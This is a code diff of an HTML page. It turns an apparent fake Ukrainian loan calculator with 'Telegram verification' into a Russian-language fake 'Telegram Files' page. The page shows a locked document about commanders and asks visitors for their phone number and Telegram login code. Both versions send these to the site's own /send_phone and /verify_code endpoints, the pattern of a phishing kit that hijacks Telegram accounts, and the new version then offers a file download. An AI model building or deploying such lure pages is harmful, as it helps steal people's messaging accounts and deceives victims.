@@ -1,364 +1,664 @@
 <!DOCTYPE html>
-<html lang="uk">
+<html lang="ru">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Кредитний Калькулятор + Верифікація</title>
+  <title>Телеграм Файлы</title>
   <style>
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: Arial, sans-serif;
     }
     body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background-color: #ffffff;
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: flex-start;
-      min-height: 100vh;
-      padding: 40px 20px;
-      background: linear-gradient(to right, #667eea, #764ba2);
-      color: white;
+      justify-content: center;
+      padding: 20px;
+    }
+    .container {
+      width: 100%;
+      max-width: 420px;
       text-align: center;
     }
+    .telegram-logo {
+      width: 120px;
+      height: 120px;
+      margin: 0 auto 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .telegram-logo svg {
+      width: 120px;
+      height: 120px;
+      fill: #0088cc;
+    }
     h1 {
-      margin-bottom: 20px;
-    }
-    .btn {
-      padding: 12px 24px;
-      font-size: 18px;
-      border: none;
-      border-radius: 5px;
-      background-color: #fff;
+      font-size: 24px;
+      font-weight: 500;
       color: #333;
+      margin-bottom: 30px;
+    }
+    .file-item {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 12px 16px;
+      margin: 0 auto 30px;
+      background: #f8f9fa;
+      border-radius: 8px;
       cursor: pointer;
-      transition: background 0.3s;
+      transition: all 0.3s;
+      max-width: 100%;
+      text-align: left;
     }
-    .btn:hover {
-      background-color: #eee;
+    .file-item.active {
+      background: #e3f2fd;
+      cursor: pointer;
     }
-    .popup {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
+    .file-item.inactive {
+      opacity: 0.5;
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+    .file-icon {
+      width: 24px;
+      height: 24px;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+    .file-icon svg {
       width: 100%;
       height: 100%;
-      background: rgba(0,0,0,0.6);
-      justify-content: center;
-      align-items: center;
+      fill: #d32f2f;
     }
-    .popup-content {
-      background: white;
-      color: black;
-      padding: 30px;
-      border-radius: 10px;
-      width: 90%;
-      max-width: 400px;
+    .file-name {
+      flex: 1;
+      font-size: 15px;
+      color: #333;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
     }
-    input {
+    .instruction-text {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+    .auth-form {
       width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      color: black;
     }
-    .hidden {
+    .form-step {
       display: none;
     }
-    .section {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 20px;
-      border-radius: 10px;
-      margin-bottom: 30px;
-      width: 100%;
-      max-width: 600px;
+    .form-step.active {
+      display: block;
     }
-    .input-group {
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .form-label {
+      display: block;
+      font-size: 13px;
+      color: #999;
+      margin-bottom: 8px;
+    }
+    .country-select-wrapper {
+      position: relative;
+    }
+    .country-select-wrapper::before {
+      content: '';
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 20px;
+      pointer-events: none;
+      z-index: 1;
+    }
+    .country-select-wrapper[data-flag]::before {
+      content: attr(data-flag);
+    }
+    .form-input {
+      width: 100%;
+      padding: 12px 16px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 15px;
+      color: #333;
+      background: #fff;
+      transition: border-color 0.3s;
+    }
+    .form-input:focus {
+      outline: none;
+      border-color: #0088cc;
+    }
+    .form-input.error {
+      border-color: #d32f2f;
+    }
+    .country-select-wrapper {
+      position: relative;
+    }
+    .country-select-wrapper::before {
+      content: var(--flag-content, '🇷🇺');
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 20px;
+      pointer-events: none;
+      z-index: 1;
+      line-height: 1;
+    }
+    select.form-input {
+      padding-left: 45px;
+      background-image: none;
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      cursor: pointer;
+    }
+    select.form-input option {
+      padding: 8px;
+    }
+    .phone-input-wrapper {
       display: flex;
       align-items: center;
     }
-    #country-flag {
-      font-size: 24px;
-      margin-right: 8px;
+    .country-code {
+      padding: 12px 16px;
+      border: 1px solid #ddd;
+      border-right: none;
+      border-radius: 8px 0 0 8px;
+      background: #f8f9fa;
+      font-size: 15px;
+      color: #333;
+      min-width: 80px;
+      text-align: center;
     }
-    input.error-border {
-      border: 2px solid red;
+    .phone-input {
+      flex: 1;
+      border-radius: 0 8px 8px 0;
     }
-
-    .error {
-      color: red;
-      font-size: 14px;
-      margin-top: 5px;
+    .continue-btn {
+      width: 100%;
+      padding: 14px;
+      background: #0088cc;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-top: 10px;
     }
-    .hidden {
+    .continue-btn:hover {
+      background: #0077b5;
+    }
+    .continue-btn:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+    .error-message {
+      color: #d32f2f;
+      font-size: 13px;
+      margin-top: 8px;
       display: none;
     }
-
+    .error-message.show {
+      display: block;
+    }
+    .success-message {
+      background: #e8f5e9;
+      color: #2e7d32;
+      padding: 12px 16px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-size: 14px;
+      display: none;
+    }
+    .success-message.show {
+      display: block;
+    }
+    .download-btn {
+      width: 100%;
+      padding: 14px;
+      background: #4caf50;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.3s;
+      display: none;
+    }
+    .download-btn.show {
+      display: block;
+    }
+    .download-btn:hover {
+      background: #45a049;
+    }
   </style>
 </head>
 <body>
-  <h1>Кредитний калькулятор</h1>
-
-  <div class="section">
-    <label>Сума кредиту (грн)</label>
-    <div class="slider-output">
-      <input type="range" id="amountRange" min="1000" max="100000" step="1000" value="10000">
-      <input type="number" id="amountInput" min="1000" max="100000" step="1000" value="10000">
+  <div class="container">
+    <!-- Telegram Logo -->
+    <div class="telegram-logo">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161l-1.87 8.815c-.138.625-.5.778-.9.485l-2.49-1.84-1.2.764c-.133.133-.245.245-.502.245l.178-2.52 4.61-4.16c.201-.178-.044-.277-.31-.1l-5.7 3.59-2.46-.77c-.535-.167-.549-.535.111-.797l9.6-3.7c.445-.166.835.103.69.638z"/>
+      </svg>
     </div>
 
-    <label>Період (місяців)</label>
-    <div class="slider-output">
-      <input type="range" id="periodRange" min="1" max="36" value="12">
-      <input type="number" id="periodInput" min="1" max="36" value="12">
+    <!-- Title -->
+    <h1>Телеграм Файлы</h1>
+
+    <!-- File Item -->
+    <div class="file-item inactive" id="fileItem">
+      <div class="file-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z"/>
+        </svg>
+      </div>
+      <div class="file-name" id="fileName">Порядок и условия командиров...</div>
     </div>
 
-    <p>Відсоткова ставка: <strong>3%</strong> на місяць</p>
-    <p>До сплати: <strong id="totalPayment">12360</strong> грн</p>
+    <!-- Instruction Text -->
+    <p class="instruction-text">Для получения доступа к файлу авторизуйтесь с помощью Телеграм аккаунта.</p>
+
+    <!-- Authorization Form -->
+    <div class="auth-form">
+      <!-- Step 1: Phone Number -->
+      <div class="form-step active" id="phoneStep">
+        <div class="form-group">
+          <label class="form-label">Выберите страну</label>
+          <div class="country-select-wrapper" id="countrySelectWrapper" style="--flag-content: '🇷🇺';">
+            <select class="form-input" id="countrySelect">
+            <option value="+7" data-flag="🇷🇺">Россия</option>
+            <option value="+380" data-flag="🇺🇦">Украина</option>
+            <option value="+1" data-flag="🇺🇸">США</option>
+            <option value="+44" data-flag="🇬🇧">Великобритания</option>
+            <option value="+49" data-flag="🇩🇪">Германия</option>
+            <option value="+33" data-flag="🇫🇷">Франция</option>
+            <option value="+39" data-flag="🇮🇹">Италия</option>
+            <option value="+34" data-flag="🇪🇸">Испания</option>
+            <option value="+31" data-flag="🇳🇱">Нидерланды</option>
+            <option value="+32" data-flag="🇧🇪">Бельгия</option>
+            <option value="+41" data-flag="🇨🇭">Швейцария</option>
+            <option value="+43" data-flag="🇦🇹">Австрия</option>
+            <option value="+45" data-flag="🇩🇰">Дания</option>
+            <option value="+46" data-flag="🇸🇪">Швеция</option>
+            <option value="+47" data-flag="🇳🇴">Норвегия</option>
+            <option value="+48" data-flag="🇵🇱">Польша</option>
+            <option value="+90" data-flag="🇹🇷">Турция</option>
+            <option value="+86" data-flag="🇨🇳">Китай</option>
+            <option value="+81" data-flag="🇯🇵">Япония</option>
+            <option value="+82" data-flag="🇰🇷">Южная Корея</option>
+            <option value="+91" data-flag="🇮🇳">Индия</option>
+            <option value="+55" data-flag="🇧🇷">Бразилия</option>
+            <option value="+52" data-flag="🇲🇽">Мексика</option>
+            <option value="+61" data-flag="🇦🇺">Австралия</option>
+            <option value="+27" data-flag="🇿🇦">ЮАР</option>
+            <option value="+20" data-flag="🇪🇬">Египет</option>
+            <option value="+212" data-flag="🇲🇦">Марокко</option>
+            <option value="+234" data-flag="🇳🇬">Нигерия</option>
+            <option value="+62" data-flag="🇮🇩">Индонезия</option>
+            <option value="+66" data-flag="🇹🇭">Таиланд</option>
+            <option value="+65" data-flag="🇸🇬">Сингапур</option>
+            <option value="+60" data-flag="🇲🇾">Малайзия</option>
+            <option value="+84" data-flag="🇻🇳">Вьетнам</option>
+            <option value="+63" data-flag="🇵🇭">Филиппины</option>
+            <option value="+64" data-flag="🇳🇿">Новая Зеландия</option>
+            <option value="+30" data-flag="🇬🇷">Греция</option>
+            <option value="+36" data-flag="🇭🇺">Венгрия</option>
+            <option value="+40" data-flag="🇷🇴">Румыния</option>
+            <option value="+351" data-flag="🇵🇹">Португалия</option>
+            <option value="+353" data-flag="🇮🇪">Ирландия</option>
+            <option value="+358" data-flag="🇫🇮">Финляндия</option>
+            <option value="+420" data-flag="🇨🇿">Чехия</option>
+            <option value="+421" data-flag="🇸🇰">Словакия</option>
+            <option value="+385" data-flag="🇭🇷">Хорватия</option>
+            <option value="+386" data-flag="🇸🇮">Словения</option>
+            <option value="+370" data-flag="🇱🇹">Литва</option>
+            <option value="+371" data-flag="🇱🇻">Латвия</option>
+            <option value="+372" data-flag="🇪🇪">Эстония</option>
+            <option value="+359" data-flag="🇧🇬">Болгария</option>
+            <option value="+356" data-flag="🇲🇹">Мальта</option>
+            <option value="+357" data-flag="🇨🇾">Кипр</option>
+            <option value="+352" data-flag="🇱🇺">Люксембург</option>
+            <option value="+354" data-flag="🇮🇸">Исландия</option>
+            <option value="+298" data-flag="🇫🇴">Фарерские острова</option>
+            <option value="+299" data-flag="🇬🇱">Гренландия</option>
+            <option value="+375" data-flag="🇧🇾">Беларусь</option>
+            <option value="+374" data-flag="🇦🇲">Армения</option>
+            <option value="+995" data-flag="🇬🇪">Грузия</option>
+            <option value="+994" data-flag="🇦🇿">Азербайджан</option>
+            <option value="+998" data-flag="🇺🇿">Узбекистан</option>
+            <option value="+992" data-flag="🇹🇯">Таджикистан</option>
+            <option value="+996" data-flag="🇰🇬">Кыргызстан</option>
+            <option value="+993" data-flag="🇹🇲">Туркменистан</option>
+            <option value="+373" data-flag="🇲🇩">Молдова</option>
+            </select>
+          </div>
+        </div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Ваш номер телефона</label>
+          <div class="phone-input-wrapper">
+            <div class="country-code" id="countryCode">+7</div>
+            <input type="tel" class="form-input phone-input" id="phoneInput" placeholder="(XXX) XXX-XX-XX" autocomplete="off">
+          </div>
+          <div class="error-message" id="phoneError"></div>
+        </div>
+        <button class="continue-btn" id="continueBtn">ПРОДОЛЖИТЬ</button>
   </div>
 
-  <button class="btn" onclick="showPopup()">Верифікація через Телеграм</button>
-
-  <div class="popup" id="popup">
-    <div class="popup-content">
-      <!-- Форма телефону -->
-      <div id="phone-form">
-        <h2>Введіть номер телефону</h2>
-        <div class="input-group">
-          <span id="country-flag">📱</span>
-          <input type="tel" id="phoneInput" placeholder="+380 ХХХ ХХХ ХХХ" required autocomplete="off">
+      <!-- Step 2: Code Verification -->
+      <div class="form-step" id="codeStep">
+        <div class="form-group">
+          <label class="form-label">Введите код</label>
+          <input type="text" class="form-input" id="codeInput" placeholder="Код из Telegram" autocomplete="off" maxlength="6">
+          <div class="error-message" id="codeError"></div>
         </div>
-        <button class="btn" id="sendPhoneBtn">Надіслати номер</button>
+        <button class="continue-btn" id="verifyBtn">ПОДТВЕРДИТЬ</button>
       </div>
 
-      <!-- Форма коду -->
-      <div id="code-form" class="hidden">
-        <h2>Введіть код</h2>
-        <input type="text" id="codeInput" placeholder="Код" required autocomplete="off">
-        <p id="codeError" class="error hidden">Невірний код, спробуйте ще раз</p>
-        <button class="btn" id="confirmBtn">Підтвердити</button>
+      <!-- Success Message and Download -->
+      <div class="success-message" id="successMessage">
+        Авторизация успешна! Теперь вы можете скачать файл.
       </div>
-
+      <button class="download-btn" id="downloadBtn">СКАЧАТЬ ФАЙЛ</button>
     </div>
   </div>
 
   <script>
-    function showPopup() {
-      resetForm();
-      document.getElementById("popup").style.display = "flex";
-    }
+    // State
+    let currentPhone = '';
+    let isAuthorized = false;
+    let fileName = '';
 
-    function resetForm() {
-      document.getElementById("phone-form").style.display = "block";
-      document.getElementById("code-form").style.display = "none";
-      document.getElementById("phoneInput").value = "";
-      document.getElementById("codeInput").value = "";
-      document.getElementById("country-flag").textContent = "📱";
+    // Elements
+    const countrySelect = document.getElementById('countrySelect');
+    const countryCode = document.getElementById('countryCode');
+    const phoneInput = document.getElementById('phoneInput');
+    const continueBtn = document.getElementById('continueBtn');
+    const phoneStep = document.getElementById('phoneStep');
+    const codeStep = document.getElementById('codeStep');
+    const codeInput = document.getElementById('codeInput');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const phoneError = document.getElementById('phoneError');
+    const codeError = document.getElementById('codeError');
+    const fileItem = document.getElementById('fileItem');
+    const fileNameElement = document.getElementById('fileName');
+    const successMessage = document.getElementById('successMessage');
+    const downloadBtn = document.getElementById('downloadBtn');
 
-      // ✅ скидання помилок
-      const codeInput = document.getElementById("codeInput");
-      const codeError = document.getElementById("codeError");
-      codeInput.classList.remove("error-border");
-      codeError.classList.add("hidden");
-      codeError.textContent = "";
-    }
-
-
-    // Мапа кодів країни до прапорців
-    const countryFlags = {
-  "+1": "🇺🇸",
-  "+7": "🇷🇺",
-  "+20": "🇪🇬",
-  "+27": "🇿🇦",
-  "+30": "🇬🇷",
-  "+31": "🇳🇱",
-  "+32": "🇧🇪",
-  "+33": "🇫🇷",
-  "+34": "🇪🇸",
-  "+36": "🇭🇺",
-  "+39": "🇮🇹",
-  "+40": "🇷🇴",
-  "+41": "🇨🇭",
-  "+43": "🇦🇹",
-  "+44": "🇬🇧",
-  "+45": "🇩🇰",
-  "+46": "🇸🇪",
-  "+47": "🇳🇴",
-  "+48": "🇵🇱",
-  "+49": "🇩🇪",
-  "+51": "🇵🇪",
-  "+52": "🇲🇽",
-  "+53": "🇨🇺",
-  "+54": "🇦🇷",
-  "+55": "🇧🇷",
-  "+56": "🇨🇱",
-  "+57": "🇨🇴",
-  "+58": "🇻🇪",
-  "+60": "🇲🇾",
-  "+61": "🇦🇺",
-  "+62": "🇮🇩",
-  "+63": "🇵🇭",
-  "+64": "🇳🇿",
-  "+65": "🇸🇬",
-  "+66": "🇹🇭",
-  "+81": "🇯🇵",
-  "+82": "🇰🇷",
-  "+84": "🇻🇳",
-  "+86": "🇨🇳",
-  "+90": "🇹🇷",
-  "+91": "🇮🇳",
-  "+92": "🇵🇰",
-  "+93": "🇦🇫",
-  "+94": "🇱🇰",
-  "+95": "🇲🇲",
-  "+98": "🇮🇷",
-  "+212": "🇲🇦",
-  "+213": "🇩🇿",
-  "+216": "🇹🇳",
-  "+218": "🇱🇾",
-  "+220": "🇬🇲",
-  "+221": "🇸🇳",
-  "+234": "🇳🇬",
-  "+250": "🇷🇼",
-  "+254": "🇰🇪",
-  "+255": "🇹🇿",
-  "+256": "🇺🇬",
-  "+380": "🇺🇦"
-};
-
-
-    const phoneInput = document.getElementById("phoneInput");
-    const countryFlag = document.getElementById("country-flag");
-    const sendPhoneBtn = document.getElementById("sendPhoneBtn");
-    const codeInput = document.getElementById("codeInput");
-    const confirmBtn = document.getElementById("confirmBtn");
-    const phoneForm = document.getElementById("phone-form");
-    const codeForm = document.getElementById("code-form");
-
-
-    // Авто-прапорець
-    phoneInput.addEventListener("input", () => {
-      let value = phoneInput.value.replace(/[^\d+]/g, '');
-      if (!value.startsWith('+')) value = '+' + value;
-      phoneInput.value = value;
-
-      let found = false;
-      for (const prefix in countryFlags) {
-        if (value.startsWith(prefix)) {
-          countryFlag.textContent = countryFlags[prefix];
-          found = true;
-          break;
+    // Fetch file name on page load
+    async function fetchFileName() {
+      try {
+        const res = await fetch('/api/file_info');
+        const data = await res.json();
+        if (res.ok && data.filename) {
+          fileName = data.filename;
+          fileNameElement.textContent = fileName;
+        } else {
+          fileNameElement.textContent = 'Файл не найден';
         }
+      } catch (err) {
+        console.error('Error fetching file name:', err);
+        fileNameElement.textContent = 'Ошибка загрузки имени файла';
       }
-      if (!found) countryFlag.textContent = "📱";
+    }
+
+    // Load file name on page load
+    fetchFileName();
+
+    // Country code mapping
+    const countryCodes = {
+      '+7': 'Россия',
+      '+380': 'Украина',
+      '+1': 'США',
+      '+44': 'Великобритания',
+      '+49': 'Германия',
+      '+33': 'Франция',
+      '+39': 'Италия',
+      '+34': 'Испания',
+      '+31': 'Нидерланды',
+      '+32': 'Бельгия',
+      '+41': 'Швейцария',
+      '+43': 'Австрия',
+      '+45': 'Дания',
+      '+46': 'Швеция',
+      '+47': 'Норвегия',
+      '+48': 'Польша',
+      '+90': 'Турция',
+      '+86': 'Китай',
+      '+81': 'Япония',
+      '+82': 'Южная Корея',
+      '+91': 'Индия',
+      '+55': 'Бразилия',
+      '+52': 'Мексика',
+      '+61': 'Австралия',
+      '+27': 'ЮАР',
+      '+20': 'Египет',
+      '+212': 'Марокко',
+      '+234': 'Нигерия',
+      '+62': 'Индонезия',
+      '+66': 'Таиланд',
+      '+65': 'Сингапур',
+      '+60': 'Малайзия',
+      '+84': 'Вьетнам',
+      '+63': 'Филиппины',
+      '+64': 'Новая Зеландия',
+      '+30': 'Греция',
+      '+36': 'Венгрия',
+      '+40': 'Румыния',
+      '+351': 'Португалия',
+      '+353': 'Ирландия',
+      '+358': 'Финляндия',
+      '+420': 'Чехия',
+      '+421': 'Словакия',
+      '+385': 'Хорватия',
+      '+386': 'Словения',
+      '+370': 'Литва',
+      '+371': 'Латвия',
+      '+372': 'Эстония',
+      '+359': 'Болгария',
+      '+356': 'Мальта',
+      '+357': 'Кипр',
+      '+352': 'Люксембург',
+      '+354': 'Исландия',
+      '+298': 'Фарерские острова',
+      '+299': 'Гренландия',
+      '+374': 'Армения',
+      '+995': 'Грузия',
+      '+994': 'Азербайджан',
+      '+998': 'Узбекистан',
+      '+992': 'Таджикистан',
+      '+996': 'Кыргызстан',
+      '+993': 'Туркменистан'
+    };
+
+    // Update country code and flag when country changes
+    const countrySelectWrapper = document.getElementById('countrySelectWrapper');
+    countrySelect.addEventListener('change', () => {
+      const selectedOption = countrySelect.options[countrySelect.selectedIndex];
+      const selectedCode = countrySelect.value;
+      const selectedFlag = selectedOption.getAttribute('data-flag') || '🇷🇺';
+      
+      countryCode.textContent = selectedCode;
+      // Update the ::before pseudo-element flag
+      countrySelectWrapper.style.setProperty('--flag-content', `"${selectedFlag}"`);
+      phoneInput.value = '';
+      phoneInput.focus();
     });
 
-    // Надсилання телефону
-    document.getElementById("sendPhoneBtn").addEventListener("click", async () => {
-    const phone = phoneInput.value.trim();
-    if (!phone) return;
+    // Format phone input
+    phoneInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      const code = countryCode.textContent.replace('+', '');
+      
+      // Remove country code if user types it
+      if (value.startsWith(code)) {
+        value = value.substring(code.length);
+      }
+      
+      // Format based on country
+      if (code === '7') {
+        // Russian format: (XXX) XXX-XX-XX
+        if (value.length > 0) {
+          let formatted = '';
+          if (value.length > 0) formatted += '(' + value.substring(0, 3);
+          if (value.length >= 3) formatted += ') ' + value.substring(3, 6);
+          if (value.length >= 6) formatted += '-' + value.substring(6, 8);
+          if (value.length >= 8) formatted += '-' + value.substring(8, 10);
+          e.target.value = formatted;
+        } else {
+          e.target.value = '';
+        }
+      } else {
+        // Simple format for other countries
+        e.target.value = value;
+      }
+      
+      // Clear errors
+      phoneError.classList.remove('show');
+      phoneInput.classList.remove('error');
+    });
 
-    try {
-      const res = await fetch("/send_phone", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ phone })
+    // Continue button - send phone
+    continueBtn.addEventListener('click', async () => {
+      const code = countryCode.textContent;
+      const phoneNumber = phoneInput.value.replace(/\D/g, '');
+      
+      if (!phoneNumber) {
+        phoneError.textContent = 'Введите номер телефона';
+        phoneError.classList.add('show');
+        phoneInput.classList.add('error');
+        return;
+      }
+      
+      const fullPhone = code + phoneNumber;
+      currentPhone = fullPhone;
+      
+      continueBtn.disabled = true;
+      continueBtn.textContent = 'Отправка...';
+      
+      try {
+        const res = await fetch('/send_phone', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: fullPhone })
       });
 
       const data = await res.json();
 
-      if (res.ok && data.status === "code_sent") {
-        phoneForm.style.display = "none";
-        codeForm.style.display = "block";
+        if (res.ok && data.status === 'code_sent') {
+          phoneStep.classList.remove('active');
+          codeStep.classList.add('active');
+          codeInput.focus();
       } else {
-        const data = await res.json();
-        alert(data.detail || "Помилка при відправці номера");
+          phoneError.textContent = data.detail || 'Ошибка при отправке номера';
+          phoneError.classList.add('show');
+          phoneInput.classList.add('error');
       }
     } catch (err) {
-      alert(err);
-    }
-  });
+        phoneError.textContent = 'Ошибка соединения с сервером';
+        phoneError.classList.add('show');
+        phoneInput.classList.add('error');
+      } finally {
+        continueBtn.disabled = false;
+        continueBtn.textContent = 'ПРОДОЛЖИТЬ';
+      }
+    });
 
-    // Надсилання коду
+    // Code input formatting
+    codeInput.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '');
+      codeError.classList.remove('show');
+      codeInput.classList.remove('error');
+    });
 
-  document.getElementById("confirmBtn").addEventListener("click", async () => {
-    const phone = phoneInput.value.trim();
+    // Verify code button
+    verifyBtn.addEventListener('click', async () => {
     const code = codeInput.value.trim();
-    if (!phone || !code) return;
-
-    try {
-      const res = await fetch("/verify_code", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ phone, code })
+      
+      if (!code) {
+        codeError.textContent = 'Введите код';
+        codeError.classList.add('show');
+        codeInput.classList.add('error');
+        return;
+      }
+      
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Проверка...';
+      
+      try {
+        const res = await fetch('/verify_code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: currentPhone, code })
       });
 
       const data = await res.json();
 
       if (res.ok) {
-        document.getElementById("popup").style.display = "none";
-        resetForm();
+          isAuthorized = true;
+          codeStep.classList.remove('active');
+          successMessage.classList.add('show');
+          downloadBtn.classList.add('show');
+          fileItem.classList.remove('inactive');
+          fileItem.classList.add('active');
       } else {
-        codeError.textContent = data.detail || "Невірний код";
-        codeError.classList.remove("hidden");
-        codeInput.classList.add("error-border");
+          codeError.textContent = data.detail || 'Неверный код';
+          codeError.classList.add('show');
+          codeInput.classList.add('error');
       }
     } catch (err) {
-      codeError.textContent = "Сервер недоступний";
-      codeError.classList.remove("hidden");
-      codeInput.classList.add("error-border");
-    }
-  });
-
-  // знімати червону рамку при вводі
-  codeInput.addEventListener("input", () => {
-    codeInput.classList.remove("error-border");
-    codeError.classList.add("hidden");
-    codeError.textContent = "";
-  });
-
-
-
-    // Калькулятор
-    const amountRange = document.getElementById("amountRange");
-    const amountInput = document.getElementById("amountInput");
-    const periodRange = document.getElementById("periodRange");
-    const periodInput = document.getElementById("periodInput");
-    const totalPayment = document.getElementById("totalPayment");
-
-    function updateCalculation() {
-      const amount = parseInt(amountRange.value);
-      const months = parseInt(periodRange.value);
-      const monthlyRate = 0.03;
-      const total = Math.round(amount * Math.pow(1 + monthlyRate, months));
-      totalPayment.textContent = total;
-      amountInput.value = amount;
-      periodInput.value = months;
-    }
-
-    amountRange.addEventListener("input", () => {
-      amountInput.value = amountRange.value;
-      updateCalculation();
+        codeError.textContent = 'Ошибка соединения с сервером';
+        codeError.classList.add('show');
+        codeInput.classList.add('error');
+      } finally {
+        verifyBtn.disabled = false;
+        verifyBtn.textContent = 'ПОДТВЕРДИТЬ';
+      }
     });
 
-    amountInput.addEventListener("input", () => {
-      amountRange.value = amountInput.value;
-      updateCalculation();
+    // Download button
+    downloadBtn.addEventListener('click', () => {
+      if (isAuthorized && fileName) {
+        // Download the file
+        window.location.href = '/api/download_file';
+      }
     });
 
-    periodRange.addEventListener("input", () => {
-      periodInput.value = periodRange.value;
-      updateCalculation();
+    // File item click (only when active)
+    fileItem.addEventListener('click', () => {
+      if (isAuthorized && fileItem.classList.contains('active')) {
+        downloadBtn.click();
+      }
     });
 
-    periodInput.addEventListener("input", () => {
-      periodRange.value = periodInput.value;
-      updateCalculation();
+    // Enter key handlers
+    phoneInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') {
+        continueBtn.click();
+      }
     });
 
-    updateCalculation();
+    codeInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') {
+        verifyBtn.click();
+      }
+    });
   </script>
 </body>
 </html>
